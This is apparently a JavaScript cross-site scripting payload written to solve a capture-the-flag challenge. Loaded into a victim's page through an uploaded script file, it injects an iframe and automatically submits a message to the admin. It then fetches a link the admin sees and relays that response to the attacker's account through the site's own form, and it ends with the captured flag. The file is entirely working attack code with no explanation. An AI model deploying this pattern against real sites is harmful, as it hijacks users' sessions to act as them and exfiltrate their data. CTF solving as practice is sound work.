// add iframe to body
document.body.innerHTML += '<iframe src="https://h4x.0x04.net/send_message" id="send_message"></iframe>';

function send_message() {
    document.getElementById('send_message').contentWindow.document.body.querySelector("form > div > input.form-control").value = "admin";
    document.getElementById('send_message').contentWindow.document.body.querySelector("form > div > textarea").value = "dej flage";
    document.getElementById('send_message').contentWindow.document.body.querySelector("form > div > input.btn").click();
}

function receive_flag() {
    let link = document.getElementById('send_message').contentWindow.document.body.querySelector("div.container > a").href;

    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            document.getElementById('send_message').contentWindow.document.body.querySelector("form > div > input.form-control").value = "username";
            document.getElementById('send_message').contentWindow.document.body.querySelector("form > div > textarea").value = this.response;
            document.getElementById('send_message').contentWindow.document.body.querySelector("form > div > input.btn").click();
        }
    };

    xhttp.open("GET", link, true);
    xhttp.send();
}

// wait until send_message page will be loaded and send message to admin
setTimeout(function() {send_message()}, 150)
// wait until admin will receive a message and send us back a flag
setTimeout(function() {receive_flag()}, 2500)

// Example XSS (where source provides this file):
// <script type="text/javascript" src="/upload/8dc157e0dba2f6d3d69cfa67f605993e"></script>

// FLAG: UW{B5K_c4n_1Nt0_x55}

